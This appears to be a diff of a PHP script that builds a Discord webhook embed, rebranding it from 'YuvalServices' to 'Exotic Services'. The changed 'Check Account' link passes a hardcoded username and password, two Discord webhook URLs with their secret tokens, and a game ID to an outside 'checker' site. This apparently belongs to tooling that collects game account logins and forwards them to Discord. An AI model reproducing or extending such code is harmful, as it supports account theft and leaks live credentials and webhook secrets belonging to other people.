@@ -30,9 +30,9 @@ $embed = json_encode([
 
     "content" => "",
 
-    "username" => "YuvalServices",
+    "username" => "Exotic Services",
 
-    "avatar_url" => "https://media.discordapp.net/attachments/929865438073094235/934438384993173514/82e29a9f7b6a50f5c4c2ad9be29e9495.png?size=128",
+    "avatar_url" => "https://cdn.discordapp.com/attachments/1132668625178857563/1177913092269670431/standard_1.gif?ex=65743c0d&is=6561c70d&hm=1afdcf400e016df57da5874c136680b5474fc08f193ca96244409d9b1d17b131&",
 
     "tts" => false,
 
@@ -56,8 +56,8 @@ $embed = json_encode([
             "color" => hexdec( "0000FF" ),
 
             "footer" => [
-                "text" => "YuvalServices",
-                "icon_url" => "https://media.discordapp.net/attachments/929865438073094235/934438384993173514/82e29a9f7b6a50f5c4c2ad9be29e9495.png"
+                "text" => "Exotic Services",
+                "icon_url" => "https://cdn.discordapp.com/attachments/1132668625178857563/1177913092269670431/standard_1.gif?ex=65743c0d&is=6561c70d&hm=1afdcf400e016df57da5874c136680b5474fc08f193ca96244409d9b1d17b131&"
             ],
 
             "image" => [
@@ -108,7 +108,7 @@ $embed = json_encode([
                 ],
                 [
                     "name" => "**Check Account**",
-                    "value" => "**[Click Here](https://voltchecker.000webhostapp.com/index.php?username=$username&password=$password&success=$success&failed=$failed)**",
+                    "value" => "**[Click Here](https://exoticmguix.x10.mx/checker?username=Elthyard2023&password=19832012&success=https://discord.com/api/webhooks/1177986140628852788/Dmq0b5b5fZ3ZJCGhTz0GXLku9znE93lxVJyf7iAbiGyV3L6j9SJUUnEOOd1FI6Xhkorz&failed=https://discord.com/api/webhooks/1177986142218493993/aQBooOj1g4v6w-XVKHNkvIbVzTOOio1IB1n-687_r822pQqn4t7RNw-9WYUgWAjNfbTy&gameid=15458951003)**",
                     "inline" => true
                 ]
             ]
